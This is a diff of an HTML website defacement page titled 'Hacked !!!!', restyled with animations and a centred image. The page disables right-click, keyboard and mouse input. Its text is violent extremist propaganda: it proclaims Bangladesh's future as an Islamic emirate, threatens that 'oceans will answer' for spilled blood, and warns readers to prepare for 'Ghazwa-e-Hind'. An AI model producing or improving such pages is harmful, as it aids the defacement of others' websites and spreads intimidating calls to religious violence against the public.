@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Hacked !!!! </title>
+  <title>Hacked !!!!</title>
   <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" />
   <style>
     html, body {
@@ -10,77 +10,124 @@
       margin: 0;
       padding: 0;
       font-family: 'Kelly Slab', sans-serif;
+      background: #d2dadd;
       color: black;
-      position: relative;
       overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
 
-    .background {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-image: url('https://raw.githubusercontent.com/FrostFoe/defaces/refs/heads/main/486822264_658016933497268_6446406093270490436_n.jpg');
-      background-repeat: no-repeat;
-      background-size: cover;
-      background-position: center;
-      background-attachment: fixed;
-      z-index: -2;
-    }
-
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.1);
-      z-index: -1;
-    }
-
-    .top-text, .bottom-text {
-      width: 100%;
+    .text-section {
       text-align: center;
       padding: 20px;
-      position: absolute;
-    }
-
-    .top-text {
-      top: 0;
-    }
-
-    .bottom-text {
-      bottom: 0;
+      width: 100%;
+      max-width: 800px;
+      margin-bottom: 20px;
+      animation: fadeIn 3s ease-out;
     }
 
     h1 {
       margin: 0;
-      padding: 15px;
-      color: black;
-      font-size: 15px;
-      line-height: 1.6;
+      font-size: 1.5rem;
+      line-height: 1.8;
+      text-shadow: 2px 2px 0 red, -2px -2px 0 red, 2px -2px 0 red, -2px 2px 0 red;
+      font-weight: bold;
+      animation: textGlow 1.5s infinite alternate;
+    }
+
+    .image-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      max-height: 50vh;
+      overflow: hidden;
+      animation: zoomIn 4s ease-out;
+    }
+
+    .background-image {
+      width: 100%;
+      max-width: 500px;
+      height: auto;
+      animation: floatImage 10s infinite alternate ease-in-out;
+    }
+
+    @keyframes floatImage {
+      0% {
+        transform: translateY(0px);
+      }
+      100% {
+        transform: translateY(-20px);
+      }
+    }
+
+    @keyframes zoomIn {
+      0% {
+        transform: scale(0.9);
+        opacity: 0;
+      }
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    @keyframes textGlow {
+      0% {
+        text-shadow: 2px 2px 0 red, -2px -2px 0 red, 2px -2px 0 red, -2px 2px 0 red;
+      }
+      50% {
+        text-shadow: 2px 2px 8px red, -2px -2px 8px red, 2px -2px 8px red, -2px 2px 8px red;
+      }
+      100% {
+        text-shadow: 2px 2px 0 red, -2px -2px 0 red, 2px -2px 0 red, -2px 2px 0 red;
+      }
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 1rem;
+      }
+
+      .background-image {
+        max-width: 90%;
+      }
     }
   </style>
 </head>
-<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
-  <div class="background"></div>
-  <div class="overlay"></div>
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;"> 
 
-  <div class="top-text">
+  <div class="text-section top-text">
     <h1>
       This is the future map of Bangladesh. <br />
       Then it will be called “United Bengal Sultanate /<br />
-      Emirate Al Islamia Bangal (EIB)”.
+      Emirate Al Islamia Bangal (EIB)”..
     </h1>
   </div>
 
-  <div class="bottom-text">
+  <div class="image-container">
+    <img class="background-image" src="https://pbs.twimg.com/media/GUs5kAVbkAAXYDw?format=jpg&name=medium" alt="Centered Image">
+  </div>
+
+  <div class="text-section bottom-text">
     <h1>
-      You’ve butchered our people. Mocked our faith. <br />
+      You’ve butchered our brothers. Mocked our faith. <br />
       For every drop you spilled, oceans will answer. <br />
       Be prepared for Ghazwa-e-Hind.
     </h1>
   </div>
+
 </body>
 </html>
